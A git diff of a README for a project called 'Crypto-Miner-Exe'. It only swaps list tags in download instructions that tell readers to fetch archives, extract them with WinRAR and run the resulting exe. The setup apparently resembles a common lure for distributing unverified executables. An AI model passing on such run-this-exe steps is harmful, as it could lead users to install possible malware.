@@ -36,19 +36,19 @@ Contributions welcome! Follow Contributing Guidelines to get involved.
 **How To Download ?**
     <li>
         <strong> Option 1: GitHub</strong>
-        <ul><ol>
+        <ol><ul>
             <li>Download both files from <a href="https://github.com/Unknown18-afk/Crypto-Miner-Exe" style="color: blue">GitHub repository</a>.</li>
             <li>Extract any one file using WinRAR <a href="https://www.rarlab.com/download.htm" style="color: blue">Download WinRAR</a>.</li>
             <li>It will give you an exe file, Run the Crypto-Miner-Exe & Enjoy!!</li>
-        </ol></ul>
+        </ul></ol>
     </li>
     <li>
         <strong> Option 2: Website</strong>
-        <ul><ol>
+        <ol><ul>
             <li><a href="https://unknown18-afk.github.io/Miner-Website18" style="color: blue">Click here</a> to visit the website.</li>
             <li>Download the zip file, extract & run it.</li>
             <li>Enjoy!!</li>
-        </ol></ul>
+        </ul></ol>
     </li>
     <li>
         <strong> Option 3: Direct Link</strong>
